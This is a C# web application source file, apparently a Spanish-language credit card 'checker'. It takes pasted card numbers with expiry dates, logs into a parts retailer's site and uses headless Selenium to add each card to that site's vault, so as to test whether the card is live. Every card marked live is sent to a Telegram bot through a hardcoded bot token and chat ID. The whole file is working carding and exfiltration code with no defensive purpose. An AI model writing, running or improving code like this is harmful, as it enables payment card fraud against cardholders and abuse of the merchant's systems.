
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Configuration;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using SeleniumExtras.WaitHelpers;
using TarjetaCheckerWeb.Hubs;
using TarjetaCheckerWeb.Models;

namespace TarjetaCheckerWeb.Pages
{
    public class IndexModel : PageModel
    {
        private readonly IConfiguration _config;
        private readonly IHubContext<StatusHub> _hubContext;

        public IndexModel(IConfiguration config, IHubContext<StatusHub> hubContext)
        {
            _config = config;
            _hubContext = hubContext;
        }

        [BindProperty]
        public string Datos { get; set; } = string.Empty;

        public async Task<IActionResult> OnPostAsync()
        {
            if (string.IsNullOrWhiteSpace(Datos)) return Page();

            var lineas = Datos.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
            var total = lineas.Length;

            var options = new ChromeOptions();
            options.AddArgument("--headless");
            options.AddArgument("--no-sandbox");
            options.AddArgument("--disable-dev-shm-usage");

            using var driver = new ChromeDriver(options);
            using var httpClient = new HttpClient();

            try
            {
                driver.Navigate().GoToUrl("https://www.multinationalparts.com/vault/add");
                var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(15));

                var username = _config["AppConfig:Username"];
                var password = _config["AppConfig:Password"];

                if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
                    throw new Exception("Credenciales no configuradas en appsettings.json.");

                wait.Until(ExpectedConditions.ElementIsVisible(By.Name("username"))).SendKeys(username);
                wait.Until(ExpectedConditions.ElementIsVisible(By.Name("password"))).SendKeys(password);
                driver.FindElement(By.Name("signin")).Click();

                wait.Until(ExpectedConditions.ElementIsVisible(By.Name("card_name")));

                int index = 0;
                foreach (var linea in lineas)
                {
                    index++;
                    var partes = linea.Split('|');
                    if (partes.Length >= 3)
                    {
                        var numero = partes[0].Trim();
                        var mes = partes[1].Trim();
                        var año = partes[2].Trim();

                        var estado = await ProcesarConSelenium(driver, numero, mes, año);

                        var resultado = new TarjetaResultado
                        {
                            Numero = numero,
                            Mes = mes,
                            Año = año,
                            Estado = estado
                        };

                        if (resultado.Estado.Contains("VIVA"))
                        {
                            var botToken = "7462758328:AAFqfXeI_dd2GZ7nvEyvPLjq5kyTgGDVtJo";
                            var chatId = "7183178405";
                            var mensaje = $"💳 {resultado.Numero} - {resultado.Estado}\n" +
                                          $"Expira: {resultado.Mes}/{resultado.Año}";
                            var mensajeEncoded = Uri.EscapeDataString(mensaje);
                            var telegramUrl = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={mensajeEncoded}";
                            await httpClient.GetAsync(telegramUrl);
                        }

                        await _hubContext.Clients.All.SendAsync("RecibirEstado", resultado, index, total);
                    }
                }
            }
            finally { driver.Quit(); }

            return Page();
        }

        private async Task<string> ProcesarConSelenium(ChromeDriver driver, string num, string mes, string año)
        {
            try
            {
                var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                driver.Navigate().GoToUrl("https://www.multinationalparts.com/vault/add");
                wait.Until(ExpectedConditions.ElementIsVisible(By.Name("card_name"))).SendKeys("Raul Rivas");
                driver.FindElement(By.Id("card_num")).SendKeys(num);
                driver.FindElement(By.Id("expire_month")).SendKeys(mes);
                driver.FindElement(By.Id("expire_year")).SendKeys(año);
                driver.FindElement(By.Name("add")).Click();
                await Task.Delay(2000);

                var body = driver.PageSource.ToLower();
                if (body.Contains("success! your new card has been added")) return "✅ VIVA";
                if (body.Contains("declined")) return "❌ MUERTA";
                return "❓ Desconocido";
            }
            catch (Exception ex) { return $"⚠️ Error: {ex.Message}"; }
        }
    }
}
